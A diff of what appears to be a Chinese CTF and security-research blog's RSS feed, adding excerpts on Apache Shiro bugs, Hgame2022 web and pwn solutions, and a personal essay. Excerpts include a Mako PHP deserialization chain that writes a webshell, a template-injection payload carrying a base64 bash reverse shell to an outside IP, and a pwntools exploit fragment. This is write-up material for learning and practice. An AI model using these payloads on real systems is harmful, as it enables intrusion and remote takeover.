@@ -20,6 +20,58 @@ private Boolean equalsImpl(Object var1) { if (var1 == this) { return true; } els
     </item>
     
     <item>
+      <title>Apache Shiro 部分历史漏洞复现</title>
+      <link>https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 22 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>太长不看 着手开始复现shiro历史漏洞其实是为了每周一次的web研讨，结果开始写的时候CVE-2022-40664刚刚爆出来，就正好混了一次展示。
+本文基本参考素十八师傅的专题 从 CVE 学 Shiro 安全的思路，加之我对其的一些粗浅理解。
+我选择了一些shiro种比较有代表性的漏洞：如CVE-2021-3863可以看作是路径处理过程中产生问题导致的绕过的代表，而CVE-2016-4437则是大名鼎鼎的shiro反序列化。其他的历史漏洞大可以拜读素十八师傅的专题文章，这里就不再复现。
+shiro 简介 见 https://www.infoq.com/articles/apache-shiro/
+主要需要了解 Subject, SecurityManager, and Realms 这三个概念
+Servlet Filter See https://tomcat.apache.org/tomcat-5.5-doc/servletapi/index.html
+public interface Filter A filter is an object that performs filtering tasks on either the request to a resource (a servlet or static content), or on the response from a resource, or both.
+Filters perform filtering in the doFilter method. Every Filter has access to a FilterConfig object from which it can obtain its initialization parameters, a reference to the ServletContext which it can use, for example, to load resources needed for filtering tasks.</description>
+    </item>
+    
+    <item>
+      <title>夜彳亍京城</title>
+      <link>https://kingbridgess.github.io/posts/%E5%A4%9C%E5%BD%B3%E4%BA%8D%E4%BA%AC%E5%9F%8E/</link>
+      <pubDate>Sun, 02 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/%E5%A4%9C%E5%BD%B3%E4%BA%8D%E4%BA%AC%E5%9F%8E/</guid>
+      <description>carpe diem.
+昨天又重温了Aidai的大作《夜彳亍》
+再一次被 Aidai 的左手“混世魔王”，右手手撕 pwn 题的技术达人形象震撼，不禁潸然泪下。看罢，我打开红楼梦，把剩下的最后一点王少赏的洋货苏打水慢慢饮尽。我不禁想知道我何时能在北京体验这样的夜彳亍 &amp;ndash; 不需要什么灯红酒绿，只消怡然自得。
+十月一号的校园实在是冷清。天空灰蒙蒙的，大抵是因为远离喧嚣的北京城的缘故。秋雨是最适合睡觉的时候， 但是好歹我想起了我是队长，否则平日我一定会在宿舍睡大觉。于是叫上 店长, SilentE , pink 被迫营业去张贴 TSCTF-J 的比赛海报。也许是国庆大多数人都出去玩的缘故，校园里显得格外冷清。很喜欢某队员对我们这几个小丑说的话:
+国庆节怎么还有人
+在学校呆着
+不约mm出去玩么
+倒也因为小丑们已经 have nothing to lose，小丑们便也在冷清的校园里疯狂起来。“团委是人，我们就不是人?”于是把海报贴在了S楼大门口; “记者团两张重复的海报，要不把右边的海报覆盖了”: 还没等善良的社长 SilentE 和记者团高层会晤结束，海报已经贴在了上面&amp;hellip;&amp;hellip;期间本来想去d楼22级网安宿舍楼里“不经意间”遗失一两张，甚至22级内线都找好了，结果被宿管一眼看穿赶了出来。放在平日，这样在校园里放肆估计是要人人喊打的，但是那一个人烟稀少的校园里，鼠鼠们终于暴露本性。还是店长的话精辟
+打CTF的多少都没什么素质
+浑浑噩噩一下午之后，晚上跟着另一帮“酒肉朋友”去串串。漫步沙河周围，完全没有帝都一分喧嚣的气息，一些地方让人怀疑像是在偏远农村。
+吃完串，pink一句
+今晚&amp;hellip;..还回去吗?
+也许是都不希望成为混子一行，大家以各种或确实很有说服力或现编的理由委婉的拒绝了。最后只剩下 pink 和我。
+就像两片随风飘拂的叶子，我们连具体要去哪里干什么都不清楚。不过好歹在上车前 figure 出了两个关键词: 什刹海，天安门。
+于是23.00，坐车驶入京城。
+如梦初醒般，我们就来到了真正的帝都。可能是北方的水实在是少，一条在南方姑且能被称作是“小溪”的河流便被称为“海”。此岸和彼岸灯火相对，还算是个温馨的地方。我们走进一家看起来比较安静的酒吧杀掉了一个小时，便慢慢向天安门夜彳亍。
+何夜无月? 何处无竹柏? 但少闲人如吾两人者耳。
+漫步静谧的什刹海，夹岸时不时会出现吉他弹唱的年轻人，也会出现唱着传统京腔叫卖的老年人。北京正是这样一个现代与古典交融一体的城市。秋雨即将落下，烟笼寒水月笼沙，我总有一种跳到什刹海里和这般美景融为一体的冲动。
+彳亍到了天安门，谁知队伍已经排到了西交民巷。秋雨已然落下，但是人们仍然心情激动。
+真正站在天安门广场的时候距离升旗还有将近3个小时，前排的位置已经被占满。
+“要不摆烂吧”
+于是直奔广场南边。
+时间一晃而过，天已经亮了。没有任何准备的，国歌就这样响起。
+https://music.163.com/#/video?id=323C4811FF45E603F74168891B117E2D
+国旗之下多少工农阶级！国旗升起之后我久久注视着国旗，思考着昨天的信仰和今天的世界，激动叹息，悲喜交加之余，在这里不便言传。
+就这样，在几乎完全没有计划的情况下，我们从破败的沙河，飘到了浪漫的什刹海，最后又彳亍到了心中为数不多的圣地。唯独这两个拉丁词语能界定这样的混子人生
+carpe diem.
+这是我对现在心境的最好概括。遗忘过去，不惧未来，把握当下。</description>
+    </item>
+    
+    <item>
       <title>0ctf Tctf 2022 Hessian Only Jdk 复现和学习</title>
       <link>https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</link>
       <pubDate>Wed, 21 Sep 2022 00:00:00 +0000</pubDate>
@@ -57,18 +109,8 @@ String cmdStr = &amp;#34;new java.lang.ProcessBuilder(new String[]{\&amp;#34;cal
       <description>Mako Framework官网
 https://makoframework.com/
 如果有可控的数据直接unserialze()，这条链可以做到任意文件写。web目录爆出来的话可以写马RCE。
-挖掘过程 kunlun跑一下，跑不出链子 遂徒手挖链
-全局搜索__destruct魔术方法 只有mako\session\Session这个类稍微有点动态调用的意思
-跟进 可以调用任意类的write方法，参数可控而且很多。
-全局搜一下__call方法，不是很多，而且基本上都是如下类型的
-$name是不可控的，所以这些__call作用不大
-那就全局搜索write方法，发现基本没有动态函数调用的影子。所以只能一个个方法递归硬看。由于write本身的含义，强烈怀疑可以任意文件写
-一个个翻阅，找到了mako\session\stores\File-&amp;gt;write()
-可以调用任意类的put方法，参数基本可控（会稍微处理一下）
-查看FileSystem属性的定义 按照注释找到了\mako\file\FileSystem
-看看put方法，确实是用来写文件的 另外isWritable就是返回指定目录是否可写 到这里写文件的链就找到了
 POC 注意绕一下File.php里对参数的处理
-&amp;lt;?php namespace mako\file{ class FileSystem{} } namespace mako\session\stores{ class File { protected $sessionPath=&amp;#34;D:/phpstudy_pro/WWW/cake/public&amp;#34;; protected $fileSystem; public function __construct(){ $this-&amp;gt;fileSystem=new \mako\file\FileSystem(); } } } namespace mako\session{ class Session{ protected $autoCommit=true; protected $flashData=&amp;#34;&amp;lt;?php eval(\$_POST[1]);//&amp;#34;; protected $sessionData = []; protected $destroyed = false; protected $store; protected $sessionId=&amp;#34;shell.php&amp;#34;; public function __construct(){ $this-&amp;gt;store=new \mako\session\stores\File(); } } } namespace { echo base64_encode(serialize(new \mako\session\Session())); } ?</description>
+&amp;lt;?php namespace mako\file{ class FileSystem{} } namespace mako\session\stores{ class File { protected $sessionPath=&amp;#34;D:/phpstudy_pro/WWW/cake/public&amp;#34;; protected $fileSystem; public function __construct(){ $this-&amp;gt;fileSystem=new \mako\file\FileSystem(); } } } namespace mako\session{ class Session{ protected $autoCommit=true; protected $flashData=&amp;#34;&amp;lt;?php eval(\$_POST[1]);//&amp;#34;; protected $sessionData = []; protected $destroyed = false; protected $store; protected $sessionId=&amp;#34;shell.php&amp;#34;; public function __construct(){ $this-&amp;gt;store=new \mako\session\stores\File(); } } } namespace { echo base64_encode(serialize(new \mako\session\Session())); } ?&amp;gt; </description>
     </item>
     
     <item>
@@ -95,6 +137,35 @@ https://www.jianshu.com/p/ae3922db1f70
 有一点，payload中有&amp;rsquo;/&amp;lsquo;就会报400错误，要避免这个。
 http://192.168.238.165:49153/__${New ProcessBuilder(&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&amp;quot;).start()}__::.x
 另外，这题是有很多其他思路的。以下参考了Flowey大佬们的wp</description>
+    </item>
+    
+    <item>
+      <title>Hgame2022 Web</title>
+      <link>https://kingbridgess.github.io/posts/hgame2022-web/</link>
+      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/hgame2022-web/</guid>
+      <description>week1 ez_auth 随便注册个账号，丢到https://jwt.io/解密,secret是空的，改成admin，得到token
+GET /v1/todo/list HTTP/1.1 Host: whatadminisdoingwhat.mjclouds.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://adminisdoingwhat.mjclouds.com/ token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MCwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDI3MzI5NjgsImlzcyI6Ik1KY2xvdWRzIn0.YYX2DeTpeRJpJqM9Vbr3DIMrV0MAOaNk53VzqtPicLA Origin: http://adminisdoingwhat.mjclouds.com Connection: close 蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛 爬虫爬到100页，flag在headers里
+import requests import re def go(): url=&amp;#34;https://hgame-spider.vidar.club/5b572441ee?key=yvHWAgnLk0DNnQDiUOYAzWXsnODq7mELHvYDgRFKpEkC%2FsDVkoVIYtg90%2F7PlRw4TdvToBS7Yq4hVcRWr%2Fch7g%3D%3D&amp;#34; while(1): res=requests.get(url=url) print(res.text) key=getKey(res.text) url=&amp;#34;https://hgame-spider.vidar.club/5b572441ee?&amp;#34;+key def getKey(text): pattern = re.compile(&amp;#39;href=&amp;#34;\?(.*?)&amp;#34;&amp;#39;) key = str(re.search(pattern=pattern, string=text).groups()[0]) return key if __name__==&amp;#34;__main__&amp;#34;: go() Tetris plus 访问view-source:https://game.summ3r.top/Tetris/js/checking.js看到jsfuck，丢到控制台得到flag
+Fujiwara Tofu Shop 一串抽象headers&amp;hellip;.
+GET / HTTP/1.</description>
+    </item>
+    
+    <item>
+      <title>Hgame Ser_per_fa复现</title>
+      <link>https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 14 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/</guid>
+      <description>虽然开源，但spfa还是看得一知半解（下辈子一定学算法
+保护全开，题目有backdoor
+dist下标可控。
+这里可以实现任意读地址
+而这里又可以实现任意写 跟进发现控制add函数的参数，to为偏移，dis为要写的值即可。 官方大致思路就是读出一堆地址，最后把main函数的返回地址写成backdoor的地址。最重要的一点就是确定stack到elf的偏移 因为pie开了，elf,libc,stack三者地址全是随机的。下面确定三者的绝对地址。 libc地址通过got表可以得到。
+elf地址通过elf文件里一个指向elf内部地址的指针可以leak。方法如下： 搜索高2字节为elf地址高2字节(这里是0x5555)的指针 比如这个指针，指向了自己 再算好其到dist的距离即可
+stack的地址: libc有一个三级指针地址_environ,指向栈中的environ,后者指向一个环境变量表。只要找到_environ指向的地址即可确定stack的地址。 然后再计算libcBase和_environ的偏移，和environ到main函数反址的偏移。 exp:
+from pwn import * # o_dist_elfAddr=0x55555555f720-0x55555555b008 # o_libcEnviron_libcBase=0x7fd0fbb332e0-0x7fd0fb944000 # o_stackEnviron_ret=0x7fffffffdf38-0x7fffffffde38 # o_elfAddr_backdoor=0x56204f05d008-0x56204f0576a5 o_dist_elfAddr = 18200 o_libcEnviron_libcBase = 2028256 o_stackEnviron_ret = 256 o_elfAddr_backdoor=22883 p=process(&amp;#39;./spfa&amp;#39;) # p=gdb.debug(&amp;#39;./spfa&amp;#39;) context.log_level=&amp;#39;debug&amp;#39; elf=ELF(&amp;#39;./spfa&amp;#39;) libc=ELF(&amp;#39;libc-2.31.so&amp;#39;) #libcBase p.sendlineafter(&amp;#39;how many datas?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;4&amp;#39;) p.sendlineafter(&amp;#39;how many nodes?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;) p.sendlineafter(&amp;#39;how many edges?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;0&amp;#39;) p.sendlineafter(&amp;#39;you want to start from which node?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;0&amp;#39;) o=-(elf.</description>
     </item>
     
     <item>
